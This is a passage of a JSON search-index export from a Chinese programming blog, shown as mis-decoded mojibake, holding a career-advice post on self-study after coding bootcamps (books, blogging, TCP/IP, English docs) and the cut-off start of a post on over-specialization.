ç‚¹ï¼š\nå±€é™æ€§ï¼šçŸ¥è¯†å±€é™äºæ•™å¸ˆçš„æˆè¯¾èŒƒå›´ï¼ŒçŸ¥è¯†é¢çª„ æ‰©å±•æ€§ï¼šå¿«é¤å¼å­¦ä¹ ç®¡é¥±ä¸ç®¡æ¶ˆåŒ–ï¼Œå¾ˆå¤šçŸ¥è¯†å¸æ”¶ä¸é«˜ï¼Œæ— æ³•ä¸¾ä¸€åä¸‰ ç³»ç»Ÿæ€§ï¼šæ²¡æœ‰ç³»ç»Ÿçš„æ•´ä½“çŸ¥è¯†ä½“ç³» æ‰€ä»¥è¿™äº›å› ç´ å¯èƒ½ä¼šè®©ç”¨äººä¸å¤ªå–œæ¬¢åŸ¹è®­å‡ºæ¥çš„åº”è˜è€…ï¼Œè€Œå¾€å¾€å¸Œæœ›åˆšæ¯•ä¸šçš„åº”å±Šç”Ÿã€‚ä½†æ˜¯ï¼ŒåŸ¹è®­è¡Œä¸šå‡ºæ¥çš„åº”è˜è€…ï¼Œä¹Ÿä¸ä¹å›½å£«æ— åŒçš„ç‰›é€¼äººç‰©ã€‚\n2. å¦‚ä½•æˆä¸ºåŸ¹è®­å‡ºæ¥çš„ç‰›äººï¼Ÿ æ— è®ºåœ¨å“ªä¸ªè¡Œä¸šï¼Œè‡ªå­¦éƒ½æ˜¯å¿…ä¸å¯å°‘çš„äº‹æƒ…ã€‚æ¯•ä¸šä¸æ˜¯å­¦ä¹ çš„ç»ˆç‚¹ï¼Œè€Œåº”è¯¥æ˜¯èµ·ç‚¹ã€‚ä½ å’ŒæŠ€æœ¯ç‰›äººä¹‹é—´çš„è·ç¦»æˆ–è®¸å¹¶ä¸é¥è¿œï¼Œå¯èƒ½åªæ˜¯ä¸€ä¸ªèŠ­è•‰æ‰‡çš„è·ç¦»ã€‚\n2.1. è¯»æƒå¨ä¹¦ç±ï¼Œæ‰å®ç†è®ºåŸºç¡€ æ¯ä¸ªè¡Œä¸šéƒ½æœ‰ä¸€äº›ç»å†æ—¶é—´è€ƒéªŒè€Œç† ç† ç”Ÿè¾‰çš„ç»å…¸æ•°æ®ï¼Œä¾‹å¦‚åœ¨å‰ç«¯è¡Œä¸šã€‚æˆ‘è®¤ä¸ºä¸‹é¢ä¸¤æœ¬ä¹¦æ˜¯å¿…é¡»è¦è¯»å®Œä¸€æœ¬çš„ã€‚\nåŸºç¡€\nJavaScripté«˜çº§ç¨‹åºè®¾è®¡ JavaScriptæƒå¨æŒ‡å— è¿›é˜¶\nJavaScriptè¯­è¨€ç²¾ç²¹ JavaScriptå¿è€…ç§˜ç± You Don\u0026rsquo;t Know JS JSå‡½æ•°å¼ç¼–ç¨‹æŒ‡å— 2.2. åŠ¨æ‰‹èƒ½åŠ›ï¼Œé—²è¯å°‘è¯´ï¼Œæ”¾ç è¿‡æ¥ å„ç§demoå•Šï¼Œæ•ˆæœå•Šï¼Œæœ‰æ—¶é—´è‡ªå·±éƒ½å¯ä»¥æ’¸ä¸€éï¼Œæ”¾åœ¨githubä¸Šï¼Œåˆä¸æ”¶é’±ï¼Œè¿˜èƒ½æé«˜åŠ¨æ‰‹èƒ½åŠ›ã€‚\n2.3. æ•°æ®ç»“æ„ å·®åŠ²çš„ç¨‹åºå‘˜æ“å¿ƒä»£ç ï¼Œç‰›é€¼çš„ç¨‹åºå‘˜æ“å¿ƒæ•°æ®ç»“æ„å’Œå®ƒä»¬ä¹‹é—´çš„å…³ç³»ã€‚ ä¸€ä¸€Linus Torvalds, Linux åˆ›å§‹äºº\nä¼˜ç§€çš„æ•°æ®ç»“æ„ï¼Œå¯ä»¥èŠ‚çœä½ 80%çš„ç¼–ç æ—¶é—´ã€‚å·®åŠ²çš„æ•°æ®ç»“æ„ï¼Œä½ éœ€è¦èŠ±å¤§é‡çš„æ—¶é—´å»åšå„ç§é«˜éš¾åº¦åŠ¨ä½œçš„è½¬æ¢ï¼Œä¸€ä¸å°å¿ƒï¼Œæ•°æ®åº“å°±è¦ç´¯çš„æ°”å–˜å¦‚ç‰›ï¼Œåœæœºç½¢å·¥ã€‚\n2.4. çŸ¥è¯†ç§¯ç´¯ï¼Œä»åšå®¢å¼€å§‹ å¦‚æœä½ å·²ç»åœ¨æŸä¸ªè¡Œä¸šå·¥ä½œä¸ªä¸¤ä¸‰å¹´ï¼Œä¸€ç¯‡åƒæ ·çš„åšå®¢éƒ½æ²¡æœ‰ã€‚\né‚£æˆ‘è§‰å¾—ä½ å¯èƒ½æ˜¯ä¸ªæ‡’äººã€‚å› ä¸ºå‡ ä¹å¾ˆå°‘å†™ä¸œè¥¿ã€‚\næˆ‘è§‰å¾—ä½ å¯ä»¥æ˜¯ä¸ªè‡ªç§çš„äººã€‚å› ä¸ºåšè®¡ç®—æœºè¡Œä¸šçš„ï¼Œè°æ²¡æœ‰ç”¨è¿‡åˆ«äººé€ çš„è½®å­ã€‚å³ä½¿ä½ æ²¡æœ‰é€ è½®å­çš„èƒ½åŠ›ï¼Œå³ä½¿ä½ ç»™å‡ºä¸€ä¸ªé—®é¢˜åº”è¯¥å¦‚ä½•è§£å†³çš„ï¼Œè‡³å°‘ä½ å¯¹è®¡ç®—æœºè¡Œä¸šä¹Ÿä½œå‡ºäº†ä½ çš„è´¡çŒ®ã€‚\n2.5. äº’è”ç½‘çš„åŸºçŸ³ TCP IP è®¡ç®—æœºè¡Œä¸šæ˜¯åˆ†å±‚çš„ï¼Œå°±åƒå¤§æµ·ä¸€æ ·ï¼Œæµ·é¢ä¸Šçš„å¾€å¾€éƒ½æ˜¯æƒŠæ¶›éª‡æµªï¼Œæš´é£éª¤é›¨ï¼Œå„ç§æ¡†æ¶å±‚å‡ºä¸ç©·ï¼Œäº‰å¥‡æ–—è‰³ã€‚å½“ä½ æ·±å…¥æµ·åº•ï¼Œä½ ä¼šå‘ç°ï¼Œé‚£é‡Œæ˜¯æœ€å¹³é™çš„åœ°æ–¹ã€‚è€ŒTCP IPç­‰åè®®çŸ¥è¯†ï¼Œå°±æ˜¯æ•´ä¸ªäº’è”ç½‘å¤§èˆªæµ·æ—¶ä»£çš„æµ·åº•ã€‚äº’è”ç½‘è¡Œä¸šå¦‚æ­¤å¤šå¨‡ï¼Œå¼•æ— æ•°æ¡†æ¶ç«æŠ˜è…°ã€‚æµªæ½®ä¹‹å·…è€…æˆä¸ºè¡Œä¸šçƒ­ç‚¹ï¼Œæ‰€æœ‰èµ„æºä¼šå–·è–„æ¶Œå…¥ï¼Œå¤±å»ä¼˜åŠ¿è¢«æ›¿ä»£è€…ï¼Œå¾€å¾€æŠ˜æˆŸæ²‰æ²™é“æœªé”€ã€‚æ€»ä¹‹ï¼Œè¶Šæ˜¯ä¸Šå±‚ï¼Œç«äº‰è¶Šæ¿€çƒˆï¼Œæ¢ä»£è¶Šå¿«ã€‚\nä½†æ˜¯åº•å±‚çš„TCP/IPä¹‹ç±»çš„çŸ¥è¯†ï¼Œå¾€å¾€å‡ åå¹´éƒ½ä¸ä¼šæœ‰å¤šå¤§çš„æ”¹å˜ã€‚è€Œä¸”æ— è®ºä½ ä»äº‹ä»€ä¹ˆè¯­è¨€å¼€å‘ï¼Œåªè¦ä½ æ¶‰åŠåˆ°é€šä¿¡äº†ï¼Œä½ å°±éœ€è¦TCP/IPçš„çŸ¥è¯†ç‚¹ï¼Œä¸è¿‡ä½ ä¸æ¸…æ¥šè¿™äº›çŸ¥è¯†ç‚¹ï¼Œä½ å¯ä»¥éšæ—¶ç»™è‡ªå·±åŸ‹ä¸‹å®šæ—¶ç‚¸å¼¹ã€‚\nè¿™ä¸ªé”™è¯¯æˆ‘ä¹ŸçŠ¯è¿‡ï¼Œä½ å¯ä»¥çœ‹æˆ‘çš„çŠ¯é”™è®°å½•ï¼šå“‘ä»£ç† - TCPé“¾æ¥é«˜Recv-Qï¼Œå†…å­˜æ³„éœ²çš„ç½ªé­ç¥¸é¦–ã€‚\nå…³äºTCP/IP, æ¨èä¸€ä¸‹ä¹¦ç±\nåŸºç¡€\nå›¾è§£TCP/IP : ç¬¬5ç‰ˆ å›¾è§£HTTP è¿›é˜¶\nHTTPæƒå¨æŒ‡å— 2.6. å·¥å…·çš„å¨åŠ› ä½ ç”¨åˆ€ï¼Œæˆ‘ç”¨æªï¼Œè°è¯´è°èƒ½æ‰“è¿‡è°ã€‚åŸå§‹ç¤¾ä¼šä¸¤ä¸ªé‡è›®äººç›¸é‡ï¼Œå—å¤´å¤§çš„ï¼Œé£Ÿç‰©å¤šï¼Œå¯ä»¥æ‹¥æœ‰æ›´å¤šçš„ç¹è¡åä»£çš„æƒåˆ©ã€‚ä½†æ˜¯å½“ä¸€ä¸ªé‡è›®äººçŸ¥é“ç”¨åˆ€çš„å¨åŠ›æ—¶ï¼Œä»–å°±ä¸ä¼šå®³æ€•èƒ³è†Šæ¯”è¾ƒç²—çš„å¯¹æ‰‹äº†ã€‚\nä¸¾ä¾‹æ¥è¯´ï¼Œå‰ç«¯å¼€å‘å…ä¸äº†æœ‰æ—¶éœ€è¦ä¸€ä¸ªé™æ€æ–‡ä»¶æœåŠ¡å™¨ï¼Œå¦‚æœä½ åªçŸ¥é“é˜¿å¸•å¥‡ï¼Œé‚£ä½ çš„å·¥å…·ä¹Ÿå¤ªè½åäº†ã€‚ä½ å¯ä»¥çœ‹çœ‹è¿™ç¯‡æ–‡ç« ï¼šä¸€è¡Œå‘½ä»¤æ­å»ºç®€æ˜“é™æ€æ–‡ä»¶httpæœåŠ¡å™¨\nå½“ä½ æƒ³è¦æ›´å·æ‡’ï¼Œæƒ³è¦ä¸å®‰äºç°çŠ¶æ—¶ï¼Œä½ ä¼šæ‰¾åˆ°æ›´å¤šçš„å‰å®³çš„å·¥å…·ã€‚\n2.7. è‹±è¯­é˜…è¯»èƒ½åŠ› ITè¡Œä¸šè¿˜æœ‰ä¸€ä¸ªç°è±¡ï¼Œå°±æ˜¯çœ‹è‹±æ–‡æ–‡æ¡£å¦‚å–ä¸­è¯ä¸€èˆ¬ï¼Œæ€»æ˜¯æç€é¼»å­ä¹Ÿçœ‹ä¸ä¸‹å»ã€‚çœ‹ä¸­æ–‡æ–‡æ¡£æ”¾ä½›å¦‚å–ç‹è€å‰ï¼Œæ¶ˆç«åˆæ»‹æ¶¦ã€‚\nITè¡Œä¸šè‡³ä»Šæ¥è¯´ï¼Œæ”¾ä½›è¿˜æ˜¯ä¸ªèˆ¶æ¥å“ã€‚æ‰€æœ‰çš„æœ€æ–°çš„æ–‡æ¡£éƒ½æ˜¯è‹±æ–‡çš„ã€‚ä½†æ˜¯ä¹Ÿä¸ä¹æœ‰å¥½çš„ä¸­æ–‡ç¿»è¯‘æ–‡æ¡£ï¼Œä½†æ˜¯éƒ½æ˜¯éœ€è¦èŠ±æ—¶é—´å»ç­‰å¾…ã€‚è€Œä¸”è‹±æ–‡æ–‡æ¡£ä¹Ÿéšç€ç¿»è¯‘è€…çš„æ°´å¹³è€Œå‚å·®ä¸é½ã€‚\nå…¶å®æˆ‘ä»¬å®Œå…¨æ²¡å¿…è¦å»å®³æ€•è‹±æ–‡æ–‡æ¡£ï¼Œå…¶å®è‹±æ–‡æ–‡æ¡£é‡Œæœ€å¸¸ç”¨çš„å•è¯å¾€å¾€æ˜¯å¾ˆå›ºå®šçš„ã€‚åˆä¸æ˜¯ä»€ä¹ˆè¨€æƒ…å°è¯´ï¼Œæ€»æ˜¯è®©ä½ æ‘¸ä¸ç€å¤´è„‘ã€‚\nä½ ä¸æƒ³çœ‹è‹±æ–‡æ–‡æ¡£ï¼Œä»æœ¬è´¨ä¸Šè¯´ï¼Œè¿˜æ˜¯å› ä¸ºä½ æ‡’ã€‚\n2.8. æ–‡æ¡£èƒ½åŠ› å¤§å¤šè¯´ç¨‹åºçš„æ–‡æ¡£éƒ½æ˜¯å†™ç»™è‡ªå·±çœ‹çš„ï¼Œæˆ–è€…è¯´å¤§å¤šè¯´çš„ç¨‹åºå‘˜çš„è¯­æ–‡éƒ½æ˜¯æ•°å­¦è€å¸ˆæ•™çš„ã€‚è¿™ä¸ªå…¶å®å¾ˆè®©çœ‹æ–‡æ¡£çš„äººè‹¦æ¼çš„ã€‚ä¸€ä¸ªä¼˜ç§€çš„ç¨‹åºå’Œæ¡†æ¶ï¼Œæ— ä¸€ä¸æ˜¯æ–‡æ¡£éå¸¸å®Œå–„ã€‚å› ä¸ºæ–‡æ¡£çš„å®Œå–„æ‰èƒ½æœ‰åˆ©äºæ–‡æ¡£çš„ä¼ æ’­ï¼Œæ‰æœ‰åˆ©äºè§£å†³é—®é¢˜ã€‚ä½ çš„æ¡†æ¶å†ç‰›é€¼ï¼Œæ•ˆç‡å†å¦‚ä½•é«˜ï¼Œæ²¡æœ‰äººèƒ½çœ‹çš„æ‡‚ï¼Œé‚£æ˜¯æ²¡ç”¨äº†ã€‚é—­é—¨é€ è½¦æ°¸è¿œä¹Ÿæä¸å‡ºå¥½ä¸œè¥¿ã€‚\nå…³äºå¦‚ä½•å†™ä½œæ–‡æ¡£ï¼Œå¯ä»¥å‚è€ƒï¼šå¦‚ä½•å†™å¥½æŠ€æœ¯æ–‡æ¡£?\n3. æ€»ç»“ å¼€æ”¾çš„æ€ç»´ï¼Œæ•¢äºæ¥çº³ä¸€äº›æ–°äº‹ç‰© ä¸æ–­å­¦ä¹ ï¼Œä¸èˆæ˜¼å¤œ è®°ç¬”è®°ï¼Œå†™åšå®¢ï¼Œè¦ç»™æ‰€æœ‰çš„åŠªåŠ›ç•™ä¸‹è®°å½• ","permalink":"https://wdd.js.org/posts/2019/10/vyu2rs/","summary":"1. åŸ¹è®­è¡Œä¸šçš„ç°çŠ¶å’Œé—®é¢˜ è¿›å…¥åŸ¹è®­ç­å­¦ä¹ å¯èƒ½æœ‰ä¸€ä¸‹ä¸¤ä¸ªåŸå› ï¼š\næƒ³è½¬è¡Œ å­¦æ ¡é‡Œå­¦çš„ä¸œè¥¿å¤ªè¿‡æ—¶äº†ï¼Œéœ€è¦æ·±å…¥å­¦ä¹ æœ¬è¡Œä¸šçš„çŸ¥è¯† åŸ¹è®­çš„è¡Œä¸šçš„æ ¸å¿ƒæ€æƒ³éƒ½æ˜¯ï¼šå¦‚ä½•å¿«é€Ÿçš„è®©ä½ èƒ½å¤Ÿé¢è¯•é€šè¿‡\nè€å¸ˆæ•™çš„ä¸œè¥¿å¤§å¤šæ˜¯ä¸€äº›é¢è¯•å¿…é¡»è¦é—®çš„ä¸€äº›çŸ¥è¯†ï¼Œåšçš„é¡¹ç›®ä¹Ÿåº”è¯¥éƒ½æ˜¯å¸‚é¢ä¸Šæ¯”è¾ƒç«çš„é¡¹ç›®ã€‚è¿™ä¹ˆåšçš„ä¸åˆ©ä¹‹å¤„æœ‰ä»¥ä¸‹å‡ ç‚¹ï¼š\nå±€é™æ€§ï¼šçŸ¥è¯†å±€é™äºæ•™å¸ˆçš„æˆè¯¾èŒƒå›´ï¼ŒçŸ¥è¯†é¢çª„ æ‰©å±•æ€§ï¼šå¿«é¤å¼å­¦ä¹ ç®¡é¥±ä¸ç®¡æ¶ˆåŒ–ï¼Œå¾ˆå¤šçŸ¥è¯†å¸æ”¶ä¸é«˜ï¼Œæ— æ³•ä¸¾ä¸€åä¸‰ ç³»ç»Ÿæ€§ï¼šæ²¡æœ‰ç³»ç»Ÿçš„æ•´ä½“çŸ¥è¯†ä½“ç³» æ‰€ä»¥è¿™äº›å› ç´ å¯èƒ½ä¼šè®©ç”¨äººä¸å¤ªå–œæ¬¢åŸ¹è®­å‡ºæ¥çš„åº”è˜è€…ï¼Œè€Œå¾€å¾€å¸Œæœ›åˆšæ¯•ä¸šçš„åº”å±Šç”Ÿã€‚ä½†æ˜¯ï¼ŒåŸ¹è®­è¡Œä¸šå‡ºæ¥çš„åº”è˜è€…ï¼Œä¹Ÿä¸ä¹å›½å£«æ— åŒçš„ç‰›é€¼äººç‰©ã€‚\n2. å¦‚ä½•æˆä¸ºåŸ¹è®­å‡ºæ¥çš„ç‰›äººï¼Ÿ æ— è®ºåœ¨å“ªä¸ªè¡Œä¸šï¼Œè‡ªå­¦éƒ½æ˜¯å¿…ä¸å¯å°‘çš„äº‹æƒ…ã€‚æ¯•ä¸šä¸æ˜¯å­¦ä¹ çš„ç»ˆç‚¹ï¼Œè€Œåº”è¯¥æ˜¯èµ·ç‚¹ã€‚ä½ å’ŒæŠ€æœ¯ç‰›äººä¹‹é—´çš„è·ç¦»æˆ–è®¸å¹¶ä¸é¥è¿œï¼Œå¯èƒ½åªæ˜¯ä¸€ä¸ªèŠ­è•‰æ‰‡çš„è·ç¦»ã€‚\n2.1. è¯»æƒå¨ä¹¦ç±ï¼Œæ‰å®ç†è®ºåŸºç¡€ æ¯ä¸ªè¡Œä¸šéƒ½æœ‰ä¸€äº›ç»å†æ—¶é—´è€ƒéªŒè€Œç† ç† ç”Ÿè¾‰çš„ç»å…¸æ•°æ®ï¼Œä¾‹å¦‚åœ¨å‰ç«¯è¡Œä¸šã€‚æˆ‘è®¤ä¸ºä¸‹é¢ä¸¤æœ¬ä¹¦æ˜¯å¿…é¡»è¦è¯»å®Œä¸€æœ¬çš„ã€‚\nåŸºç¡€\nJavaScripté«˜çº§ç¨‹åºè®¾è®¡ JavaScriptæƒå¨æŒ‡å— è¿›é˜¶\nJavaScriptè¯­è¨€ç²¾ç²¹ JavaScriptå¿è€…ç§˜ç± You Don\u0026rsquo;t Know JS JSå‡½æ•°å¼ç¼–ç¨‹æŒ‡å— 2.2. åŠ¨æ‰‹èƒ½åŠ›ï¼Œé—²è¯å°‘è¯´ï¼Œæ”¾ç è¿‡æ¥ å„ç§demoå•Šï¼Œæ•ˆæœå•Šï¼Œæœ‰æ—¶é—´è‡ªå·±éƒ½å¯ä»¥æ’¸ä¸€éï¼Œæ”¾åœ¨githubä¸Šï¼Œåˆä¸æ”¶é’±ï¼Œè¿˜èƒ½æé«˜åŠ¨æ‰‹èƒ½åŠ›ã€‚\n2.3. æ•°æ®ç»“æ„ å·®åŠ²çš„ç¨‹åºå‘˜æ“å¿ƒä»£ç ï¼Œç‰›é€¼çš„ç¨‹åºå‘˜æ“å¿ƒæ•°æ®ç»“æ„å’Œå®ƒä»¬ä¹‹é—´çš„å…³ç³»ã€‚ ä¸€ä¸€Linus Torvalds, Linux åˆ›å§‹äºº\nä¼˜ç§€çš„æ•°æ®ç»“æ„ï¼Œå¯ä»¥èŠ‚çœä½ 80%çš„ç¼–ç æ—¶é—´ã€‚å·®åŠ²çš„æ•°æ®ç»“æ„ï¼Œä½ éœ€è¦èŠ±å¤§é‡çš„æ—¶é—´å»åšå„ç§é«˜éš¾åº¦åŠ¨ä½œçš„è½¬æ¢ï¼Œä¸€ä¸å°å¿ƒï¼Œæ•°æ®åº“å°±è¦ç´¯çš„æ°”å–˜å¦‚ç‰›ï¼Œåœæœºç½¢å·¥ã€‚\n2.4. çŸ¥è¯†ç§¯ç´¯ï¼Œä»åšå®¢å¼€å§‹ å¦‚æœä½ å·²ç»åœ¨æŸä¸ªè¡Œä¸šå·¥ä½œä¸ªä¸¤ä¸‰å¹´ï¼Œä¸€ç¯‡åƒæ ·çš„åšå®¢éƒ½æ²¡æœ‰ã€‚\né‚£æˆ‘è§‰å¾—ä½ å¯èƒ½æ˜¯ä¸ªæ‡’äººã€‚å› ä¸ºå‡ ä¹å¾ˆå°‘å†™ä¸œè¥¿ã€‚\næˆ‘è§‰å¾—ä½ å¯ä»¥æ˜¯ä¸ªè‡ªç§çš„äººã€‚å› ä¸ºåšè®¡ç®—æœºè¡Œä¸šçš„ï¼Œè°æ²¡æœ‰ç”¨è¿‡åˆ«äººé€ çš„è½®å­ã€‚å³ä½¿ä½ æ²¡æœ‰é€ è½®å­çš„èƒ½åŠ›ï¼Œå³ä½¿ä½ ç»™å‡ºä¸€ä¸ªé—®é¢˜åº”è¯¥å¦‚ä½•è§£å†³çš„ï¼Œè‡³å°‘ä½ å¯¹è®¡ç®—æœºè¡Œä¸šä¹Ÿä½œå‡ºäº†ä½ çš„è´¡çŒ®ã€‚\n2.5. äº’è”ç½‘çš„åŸºçŸ³ TCP IP è®¡ç®—æœºè¡Œä¸šæ˜¯åˆ†å±‚çš„ï¼Œå°±åƒå¤§æµ·ä¸€æ ·ï¼Œæµ·é¢ä¸Šçš„å¾€å¾€éƒ½æ˜¯æƒŠæ¶›éª‡æµªï¼Œæš´é£éª¤é›¨ï¼Œå„ç§æ¡†æ¶å±‚å‡ºä¸ç©·ï¼Œäº‰å¥‡æ–—è‰³ã€‚å½“ä½ æ·±å…¥æµ·åº•ï¼Œä½ ä¼šå‘ç°ï¼Œé‚£é‡Œæ˜¯æœ€å¹³é™çš„åœ°æ–¹ã€‚è€ŒTCP IPç­‰åè®®çŸ¥è¯†ï¼Œå°±æ˜¯æ•´ä¸ªäº’è”ç½‘å¤§èˆªæµ·æ—¶ä»£çš„æµ·åº•ã€‚äº’è”ç½‘è¡Œä¸šå¦‚æ­¤å¤šå¨‡ï¼Œå¼•æ— æ•°æ¡†æ¶ç«æŠ˜è…°ã€‚æµªæ½®ä¹‹å·…è€…æˆä¸ºè¡Œä¸šçƒ­ç‚¹ï¼Œæ‰€æœ‰èµ„æºä¼šå–·è–„æ¶Œå…¥ï¼Œå¤±å»ä¼˜åŠ¿è¢«æ›¿ä»£è€…ï¼Œå¾€å¾€æŠ˜æˆŸæ²‰æ²™é“æœªé”€ã€‚æ€»ä¹‹ï¼Œè¶Šæ˜¯ä¸Šå±‚ï¼Œç«äº‰è¶Šæ¿€çƒˆï¼Œæ¢ä»£è¶Šå¿«ã€‚\nä½†æ˜¯åº•å±‚çš„TCP/IPä¹‹ç±»çš„çŸ¥è¯†ï¼Œå¾€å¾€å‡ åå¹´éƒ½ä¸ä¼šæœ‰å¤šå¤§çš„æ”¹å˜ã€‚è€Œä¸”æ— è®ºä½ ä»äº‹ä»€ä¹ˆè¯­è¨€å¼€å‘ï¼Œåªè¦ä½ æ¶‰åŠåˆ°é€šä¿¡äº†ï¼Œä½ å°±éœ€è¦TCP/IPçš„çŸ¥è¯†ç‚¹ï¼Œä¸è¿‡ä½ ä¸æ¸…æ¥šè¿™äº›çŸ¥è¯†ç‚¹ï¼Œä½ å¯ä»¥éšæ—¶ç»™è‡ªå·±åŸ‹ä¸‹å®šæ—¶ç‚¸å¼¹ã€‚\nè¿™ä¸ªé”™è¯¯æˆ‘ä¹ŸçŠ¯è¿‡ï¼Œä½ å¯ä»¥çœ‹æˆ‘çš„çŠ¯é”™è®°å½•ï¼šå“‘ä»£ç† - TCPé“¾æ¥é«˜Recv-Qï¼Œå†…å­˜æ³„éœ²çš„ç½ªé­ç¥¸é¦–ã€‚\nå…³äºTCP/IP, æ¨èä¸€ä¸‹ä¹¦ç±\nåŸºç¡€\nå›¾è§£TCP/IP : ç¬¬5ç‰ˆ å›¾è§£HTTP è¿›é˜¶\nHTTPæƒå¨æŒ‡å— 2.6. å·¥å…·çš„å¨åŠ› ä½ ç”¨åˆ€ï¼Œæˆ‘ç”¨æªï¼Œè°è¯´è°èƒ½æ‰“è¿‡è°ã€‚åŸå§‹ç¤¾ä¼šä¸¤ä¸ªé‡è›®äººç›¸é‡ï¼Œå—å¤´å¤§çš„ï¼Œé£Ÿç‰©å¤šï¼Œå¯ä»¥æ‹¥æœ‰æ›´å¤šçš„ç¹è¡åä»£çš„æƒåˆ©ã€‚ä½†æ˜¯å½“ä¸€ä¸ªé‡è›®äººçŸ¥é“ç”¨åˆ€çš„å¨åŠ›æ—¶ï¼Œä»–å°±ä¸ä¼šå®³æ€•èƒ³è†Šæ¯”è¾ƒç²—çš„å¯¹æ‰‹äº†ã€‚\nä¸¾ä¾‹æ¥è¯´ï¼Œå‰ç«¯å¼€å‘å…ä¸äº†æœ‰æ—¶éœ€è¦ä¸€ä¸ªé™æ€æ–‡ä»¶æœåŠ¡å™¨ï¼Œå¦‚æœä½ åªçŸ¥é“é˜¿å¸•å¥‡ï¼Œé‚£ä½ çš„å·¥å…·ä¹Ÿå¤ªè½åäº†ã€‚ä½ å¯ä»¥çœ‹çœ‹è¿™ç¯‡æ–‡ç« ï¼šä¸€è¡Œå‘½ä»¤æ­å»ºç®€æ˜“é™æ€æ–‡ä»¶httpæœåŠ¡å™¨\nå½“ä½ æƒ³è¦æ›´å·æ‡’ï¼Œæƒ³è¦ä¸å®‰äºç°çŠ¶æ—¶ï¼Œä½ ä¼šæ‰¾åˆ°æ›´å¤šçš„å‰å®³çš„å·¥å…·ã€‚\n2.7. è‹±è¯­é˜…è¯»èƒ½åŠ› ITè¡Œä¸šè¿˜æœ‰ä¸€ä¸ªç°è±¡ï¼Œå°±æ˜¯çœ‹è‹±æ–‡æ–‡æ¡£å¦‚å–ä¸­è¯ä¸€èˆ¬ï¼Œæ€»æ˜¯æç€é¼»å­ä¹Ÿçœ‹ä¸ä¸‹å»ã€‚çœ‹ä¸­æ–‡æ–‡æ¡£æ”¾ä½›å¦‚å–ç‹è€å‰ï¼Œæ¶ˆç«åˆæ»‹æ¶¦ã€‚","title":"å¦‚ä½•æˆä¸ºä»åŸ¹è®­ç­é‡Œå‡ºæ¥çš„ç‰›äººï¼Ÿ"},{"content":"ä»åˆ†å·¥åˆ°ä¸“ä¸šåŒ– åˆ†å·¥æé«˜ç”Ÿäº§æ•ˆç‡ï¼Œä¸“ä¸šåŒ–æé«˜ä¸ªäººä»·å€¼ã€‚å¾ˆå¤šäººéƒ½è®¤ä¸ºï¼Œä¸€æ—¦æˆ‘ä»¬è¿›å…¥äº†æŸä¸€è¡Œï¼Œæˆ‘ä»¬å°±åº”è¯¥åœ¨è¿™ä¸ªè¡Œä¸šæ·±æŒ–åˆ°åº•ã€‚ä¾‹å¦‚æˆ‘æ˜¯åšå‰ç«¯çš„ï¼Œæˆ‘å°±ä¼šå»å­¦ä¹ å„ç§å‰ç«¯çš„çŸ¥è¯†ç‚¹ï¼Œå„ç§å±‚å‡ºä¸ç©·çš„æ¡†æ¶ã€‚æˆ‘æ€»æ˜¯åœ¨å¦‚é¥¥ä¼¼æ¸´çš„å¸Œæœ›è‡ªå·±èƒ½å¤Ÿä¿æŒåœ¨æ·±å…¥å­¦ä¹ çš„çŠ¶æ€ï¼Œæˆ‘ä¸æƒ³å“ªä¸€å¤©è‡ªå·±çªç„¶outäº†ã€‚\nä¸“ä¸šåŒ–çš„å±æœºåœ¨å“ªï¼Ÿ ä»¥å‰æˆ‘åœ¨ä¸Šåˆä¸­çš„æ—¶å€™ï¼Œå°±ç¨ç¨çš„å­¦ä¹ äº†ä¸€ç‚¹ç‚¹ActionScriptçš„çŸ¥è¯†ã€‚å¯èƒ½æœ‰äº›äººä¸çŸ¥é“ActionScriptæ˜¯å¹²å˜›çš„ï¼Œå®ƒæ˜¯åœ¨flashçš„ç¯å¢ƒä¸­å·¥ä½œçš„ï¼Œå¯ä»¥åœ¨flashé‡Œåšä¸€äº›åŠ¨ç”»å’Œç‰¹æ•ˆä¹‹ç±»çš„ã€‚é‚£æ—¶å€™flashæ˜¯å¾ˆç«çš„æŠ€æœ¯ï¼Œå‡ ä¹æ‰€æœ‰çš„ç½‘ç«™éƒ½æ˜¯æœ‰flashçš„ï¼Œæ‰€ä»¥ä¼šActionScriptè¯­è¨€çš„ç¨‹åºå‘˜ï¼Œå·¥èµ„éƒ½ä¸ä½ã€‚\nä½†æ˜¯ï¼Œä½ ç°åœ¨è¿˜å¬è¿‡ä»€ä¹ˆActionScriptå—ï¼Ÿ å®ƒçš„å®¿ä¸»ç¯å¢ƒflashéƒ½å·²ç»è¢«æ·˜æ±°äº†ï¼Œçš®ä¹‹ä¸å­˜æ¯›å°†ç„‰é™„ã€‚å¯æƒ³è€ŒçŸ¥ï¼Œflashçš„æ·˜æ±°ï¼ŒåŒæ—¶ä¹Ÿè®©æ—¶é•¿æ·˜æ±°äº†ä¸€æ‰¹åœ¨ActionScriptçš„ä¸“å®¶ã€‚\næ‰€ä»¥ï¼Œä¸“ä¸šåŒ–å¹¶ä¸æ˜¯ä¸€ä¸ªå®‰å…¨çš„é“è·¯ã€‚å‡†ç¡®æ¥è¯´ï¼Œä¸–ç•Œä¸Šæœ¬æ¥å°±æ²¡æœ‰å®‰å…¨çš„è·¯ã€‚å¤§å¤šè¯´è®¤ä¸ºè¿™æ¡è·¯å®‰å…¨ï¼Œæ˜¯å› ä¸ºä»–ä»¬æ€»æ˜¯ä»¥é™æ€çš„çœ¼å…‰çœ‹è¿™æ¡è·¯ã€‚è¯´ç‚¹é¢˜å¤–è¯ï¼Œå¦‚æœä½ ä¹¦è¯»å¤šäº†ï¼Œä½ ä¼šå‘ç°ï¼Œå…¶å®ä¸€ç›´åœ¨ä½ æ€æƒ³é‡Œçš„é‚£äº›è§‚å¿µï¼Œé‚£äº›æ•…äº‹ï¼Œå¾€å¾€éƒ½æ˜¯å¿½æ‚ äººçš„ã€‚ä½ å¯ä»¥çœ‹çœ‹æˆ‘çš„ä¸€ä¸ªä¹¦å•ï¼š2018å¹´æˆ‘çš„é˜…è¯»è®¡åˆ’ã€‚\nä»ä¼ä¸šçš„è§’åº¦è€ƒè™‘ï¼Œæ¯ä¸ªè€æ¿éƒ½æƒ³æ‹›åœ¨æŸä¸€æ–¹é¢ä¸“å®¶ã€‚ä½†æ˜¯ä»ä¸ªäººçš„è§’åº¦è€ƒè™‘ï¼Œå¦‚æœä½ åœ¨ä¸“ä¸šåŒ–çš„é“è·¯é’»ç ”çš„éå¸¸æ·±ï¼Œæˆ–è®¸æœ‰æ—¶å€™ä½ åº”è¯¥æ”¾æ…¢è„šæ­¥ï¼Œæ‰¾ä¸ªé•¿æ¤…ï¼Œåç€æƒ³ä¸€æƒ³ï¼Œå¦‚æœä½ 